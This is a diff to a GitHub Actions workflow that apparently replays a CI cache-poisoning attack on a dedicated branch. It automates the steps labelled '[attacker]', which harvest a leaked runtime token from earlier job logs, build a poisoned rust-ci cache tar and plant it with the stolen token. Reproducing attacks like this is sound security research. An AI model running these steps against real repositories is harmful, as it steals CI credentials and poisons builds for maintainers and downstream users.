@@ -32,8 +32,8 @@ on:
   workflow_dispatch:
     inputs:
       stage1_run_id:
-        description: "Stage 1 run ID to harvest the leaked runtime token from"
-        required: true
+        description: "Stage 1 run ID to harvest the leaked runtime token from (empty = most recent stage-1 run on this branch)"
+        required: false
         type: string
       variant:
         description: "Which scenario to run"
@@ -43,6 +43,9 @@ on:
         options:
           - malicious
           - clean
+  push:
+    branches: [replay/depi-codex-backdoor]
+    paths: [replay/depi/.trigger-stage2]
 
 permissions:
   contents: read
@@ -75,13 +78,21 @@ jobs:
       # job log through the same API surface.
       # ------------------------------------------------------------------
       - name: "[attacker] harvest leaked runtime token from stage-1 logs"
-        if: ${{ inputs.variant == 'malicious' }}
+        if: ${{ inputs.variant != 'clean' }}
         id: harvest
         env:
           GH_TOKEN: ${{ github.token }}
           STAGE1_RUN_ID: ${{ inputs.stage1_run_id }}
         run: |
           set -euo pipefail
+          if [ -z "$STAGE1_RUN_ID" ]; then
+            STAGE1_RUN_ID=$(gh run list --repo "${{ github.repository }}" \
+              --branch replay/depi-codex-backdoor \
+              --workflow garnet-depi-stage1.yml --limit 1 --json databaseId \
+              --jq '.[0].databaseId')
+            echo "auto-discovered stage-1 run: $STAGE1_RUN_ID"
+            echo "STAGE1_RUN_ID=$STAGE1_RUN_ID" >> "$GITHUB_ENV"
+          fi
           python3 replay/depi/attacker/harvest_token.py > /tmp/harvest.out
           cat /tmp/harvest.out
           if grep -q '^DEPI_TOKEN=' /tmp/harvest.out; then
@@ -92,7 +103,7 @@ jobs:
           fi
 
       - name: "[attacker] compute rust-ci cache key + build poisoned tar"
-        if: ${{ inputs.variant == 'malicious' }}
+        if: ${{ inputs.variant != 'clean' }}
         run: |
           set -euo pipefail
           # Replicate hashFiles() for the exact key rust-ci's
@@ -132,7 +143,7 @@ jobs:
       # Cacheract automates.
       # ------------------------------------------------------------------
       - name: "[attacker] plant poisoned cache entry (stolen token)"
-        if: ${{ inputs.variant == 'malicious' }}
+        if: ${{ inputs.variant != 'clean' }}
         env:
           STOLEN_TOKEN: ${{ steps.harvest.outputs.DEPITOKEN }}
         run: |
